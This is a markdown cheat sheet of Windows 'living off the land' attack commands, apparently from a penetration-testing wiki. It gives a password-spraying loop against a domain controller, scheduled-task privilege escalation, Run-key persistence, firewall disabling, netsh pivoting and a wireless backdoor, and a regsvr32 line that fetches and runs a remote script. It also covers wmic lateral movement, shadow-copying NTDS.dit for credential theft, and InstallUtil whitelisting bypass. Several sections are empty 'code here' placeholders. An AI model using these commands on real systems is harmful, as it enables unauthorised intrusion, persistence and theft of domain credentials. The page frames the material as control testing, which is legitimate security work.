# Native - Living off the land

Living off the land is using native operating system utilities to bypass controls in place. At most organizations, this will be AppWhitelisting, AV, endpoint detection software and so on. From the endpoint to the network, you should see some type of activity occur. If you have deep packet inspection, and a sct file is downloaded with powershell, did your network device detect or prevent this? Remember, this is to determine if your current controls are properly working as they were described to you.

## One Liners


## net.exe

### Password Spraying

http://pwnwiki.io/#!privesc/windows/index.md#Password_Spraying

    net user /domain > DomainUsers.txt
    echo "Password1" >> pass.txt
    echo "1q2w3e4r" >> pass.txt

For loop:

    @FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (pass.txt) DO @net use \\COMPANYDC1\IPC$ /user:COMPANY\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\COMPANYDC1\IPC$ > NUL

## at.exe

Note: deprecated in Windows 8+

### Privileged Escalation

This command can be used locally to escalate privilege to SYSTEM or be used across a network to execute commands on another system.

http://pwnwiki.io/#!privesc/windows/index.md

Input:

    at 13:20 /interactive cmd

Example:

    net use \\[computername|IP] /user:DOMAIN\username password
    net time \\[computername|IP]
    at \\[computername|IP] 13:20 c:\temp\evil.bat

## schtask.exe

### Launch Interactive cmd.exe

Input:

    SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10


## reg.exe

Input:

    code here

Output:

    code here

Examples:

    reg add hkcu\software\microsoft\windows\currentversion\run /v netshare /f /d %temp%\notilv.exe /t REG_EXPAND_SZ

    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ausMfTQVsuC /t REG_EXPAND_SZ /d "\"C:\Users\IEUser\AppData\Roaming\Oracle\bin\javaw.exe\" -jar \"C:\Users\IEUser\wBJLxnECLJF\FysHVwDWznz.ICgcjG\"" /f

## Netsh.exe

http://pwnwiki.io/#!pivoting/windows/windows_cmd_network.md

### Firewall Control

Input:

    netsh firewall set opmode [disable|enable]

### Netsh.exe Pivoting

Input:

    netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1

Can also support v4tov6, v6tov6, and v6tov4

### Netsh.exe Sniffing

Input:

    netsh trace start capture=yes overwrite=no tracefile=<FilePath.etl>

to stop:

    netsh trace stop

### Netsh.exe Wireless backdoor

Input:

    netsh wlan set hostednetwork mode=[allow\|disallow]
    netsh wlan set hostednetwork ssid=<ssid> key=<passphrase> keyUsage=persistent\|temporary
    netsh wlan [start|stop] hostednetwork

Enables or disables hostednetwork service.
Complete hosted network setup for creating a wireless backdoor.
Starts or stops a wireless backdoor. See below to set it up.

## Regsvr32.exe

Input:

    code here

Output:

    code here

    regsvr32.exe /s /n /u /i:https://<website>/data scrobj.dll

## waitfor.exe

Input:

    code here

Output:

    code here

## wmic.exe

Provided by: https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf


### Reconnaissance

Input:

    wmic useraccount get /ALL

Input:

    wmic process get caption,executablepath,commandline

Input:

    wmic qfe get description,installedOn /format:csv

Input:

    wmic /node:”192.168.0.1” service where (caption like “%sql server (%”)

Input:

    get-wmiobject –class “win32_share” –namespace “root\CIMV2” –computer “targetname”

### Lateral Movement

Input:

    wmic /node:REMOTECOMPUTERNAME process call create “COMMAND AND ARGUMENTS"

Input:

    wmic /NODE: “192.168.0.1” process call create “evil.exe”

### Privileged Escalation

Input:

    wmic /node:REMOTECOMPUTERNAME PROCESS call create “at 9:00PM c:\GoogleUpdate.exe ^> c:\notGoogleUpdateResults.txt"

Input:

    wmic /node:REMOTECOMPUTERNAME PROCESS call create “cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit“

## bitsadmin.exe

Input:

    code here

Output:

    code here

## Installutil.exe

Download the two binaries:

Input for pshell.dll:

    C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /U pshell.dll

Input for rwxhunter.exe:

    C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /U rwxhunter.exe
